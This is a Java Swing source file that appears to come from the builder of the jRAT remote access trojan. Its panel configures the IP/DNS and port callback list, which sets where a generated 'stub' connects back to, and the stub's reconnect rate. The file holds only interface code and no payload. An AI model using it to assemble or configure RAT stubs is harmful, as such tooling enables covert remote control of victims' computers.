package se.jrat.client.ui.panels;

import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.net.InetAddress;

import javax.swing.DefaultListModel;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JSpinner;
import javax.swing.JTextField;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.SpinnerNumberModel;

import se.jrat.client.ErrorDialog;
import se.jrat.client.settings.Settings;
import se.jrat.client.ui.components.JPlaceholderTextField;
import se.jrat.client.utils.NetUtils;


@SuppressWarnings("serial")
public class PanelBuildNetwork extends JPanel {

	private JTextField txtIP;
	private JSpinner spinPort;
	private JSpinner spinRate;
	private JList<String> list;
	private DefaultListModel<String> model;

	public int getConnectionRate() {
		return Integer.parseInt(spinRate.getValue().toString());
	}

	public PanelBuildNetwork() {
		JScrollPane scrollPane = new JScrollPane();

		txtIP = new JPlaceholderTextField("127.0.0.1");
		txtIP.setText(Settings.getGlobal().getString("bip"));
		txtIP.setColumns(10);

		spinPort = new JSpinner();
		spinPort.setModel(new SpinnerNumberModel(Settings.getGlobal().getInt("bport"), 1, 65535, 1));

		spinRate = new JSpinner();
		spinRate.setToolTipText("Seconds between stub reconnect attempts");
		spinRate.setModel(new SpinnerNumberModel(Settings.getGlobal().getInt("brecat"), 1, 120, 1));

		JLabel lblReconnectRate = new JLabel("Reconnect rate:");
		lblReconnectRate.setToolTipText("Reconnect rate in seconds between each connection attempt");

		JLabel lblPort = new JLabel("Port:");

		JLabel lblIp = new JLabel("IP/DNS:");

		JButton btnAdd = new JButton("Add");
		btnAdd.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String ip = txtIP.getText().trim();
				int port = (Integer) spinPort.getValue();

				String addr = ip + ":" + port;

				for (int i = 0; i < model.getSize(); i++) {
					String s = model.get(i);

					if (s.equals(addr)) {
						return;
					}
				}

				model.addElement(addr);
			}
		});
		btnAdd.setIcon(new ImageIcon(PanelBuildNetwork.class.getResource("/icons/socket_add.png")));

		JButton btnMoveDown = new JButton("Move Down");
		btnMoveDown.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				int indexOfSelected = list.getSelectedIndex();
				swapElements(indexOfSelected, indexOfSelected + 1);
				indexOfSelected = indexOfSelected + 1;
				list.setSelectedIndex(indexOfSelected);
				list.updateUI();
			}
		});

		JButton btnMoveUp = new JButton("Move Up");
		btnMoveUp.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				int indexOfSelected = list.getSelectedIndex();
				swapElements(indexOfSelected, indexOfSelected - 1);
				indexOfSelected = indexOfSelected - 1;
				list.setSelectedIndex(indexOfSelected);
				list.updateUI();
			}
		});

		JButton btnRemove = new JButton("Remove");
		btnRemove.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				int i = list.getSelectedIndex();

				model.remove(i);
			}
		});
		btnRemove.setIcon(null);
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addGroup(groupLayout.createParallelGroup(Alignment.LEADING, false).addGroup(groupLayout.createSequentialGroup().addComponent(lblIp).addPreferredGap(ComponentPlacement.RELATED).addComponent(txtIP, GroupLayout.PREFERRED_SIZE, 188, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(lblPort).addPreferredGap(ComponentPlacement.RELATED).addComponent(spinPort, GroupLayout.PREFERRED_SIZE, 84, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnAdd, GroupLayout.PREFERRED_SIZE, 75, GroupLayout.PREFERRED_SIZE)).addGroup(groupLayout.createSequentialGroup().addComponent(lblReconnectRate).addPreferredGap(ComponentPlacement.RELATED).addComponent(spinRate, GroupLayout.PREFERRED_SIZE, 72, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE).addComponent(btnRemove).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnMoveUp).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnMoveDown))).addContainerGap(13, Short.MAX_VALUE)).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 450, Short.MAX_VALUE));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(lblIp).addComponent(txtIP, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(lblPort).addComponent(spinPort, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(btnAdd)).addPreferredGap(ComponentPlacement.RELATED, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(lblReconnectRate).addComponent(spinRate, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(btnMoveDown).addComponent(btnMoveUp).addComponent(btnRemove)).addPreferredGap(ComponentPlacement.UNRELATED).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 223, GroupLayout.PREFERRED_SIZE)));

		JPopupMenu popupMenu = new JPopupMenu();
		addPopup(txtIP, popupMenu);

		JMenuItem mntmGetLanAddress = new JMenuItem("Get LAN address");
		mntmGetLanAddress.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				try {
					txtIP.setText(InetAddress.getLocalHost().getHostAddress());
				} catch (Exception e1) {
					e1.printStackTrace();
					ErrorDialog.create(e1);
				}
			}
		});
		mntmGetLanAddress.setIcon(new ImageIcon(PanelBuildNetwork.class.getResource("/icons/network-ip-local.png")));
		popupMenu.add(mntmGetLanAddress);

		JMenuItem mntmGetWanAddress = new JMenuItem("Get WAN address");
		mntmGetWanAddress.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				try {
					txtIP.setText(NetUtils.getIP());
				} catch (Exception e1) {
					e1.printStackTrace();
					ErrorDialog.create(e1);
				}
			}
		});
		mntmGetWanAddress.setIcon(new ImageIcon(PanelBuildNetwork.class.getResource("/icons/network-ip.png")));
		popupMenu.add(mntmGetWanAddress);

		model = new DefaultListModel<String>();
		list = new JList<String>(model);

		scrollPane.setViewportView(list);
		setLayout(groupLayout);
		
		String addresses = Settings.getGlobal().getString("baddresses");
		
		if (addresses != null) {
			for (String s : addresses.split(",")) {
				model.addElement(s);
			}
		}

	}

	public String[] getAddresses() {
		String[] addr = new String[model.size()];

		for (int i = 0; i < model.size(); i++) {
			addr[i] = model.get(i);
		}

		return addr;
	}

	public void swapElements(int pos1, int pos2) {
		String s = model.get(pos1);
		model.set(pos1, model.get(pos2));
		model.set(pos2, s);
	}

	private static void addPopup(Component component, final JPopupMenu popup) {
		component.addMouseListener(new MouseAdapter() {
			public void mousePressed(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}

			public void mouseReleased(MouseEvent e) {
				if (e.isPopupTrigger()) {
					showMenu(e);
				}
			}

			private void showMenu(MouseEvent e) {
				popup.show(e.getComponent(), e.getX(), e.getY());
			}
		});
	}
}
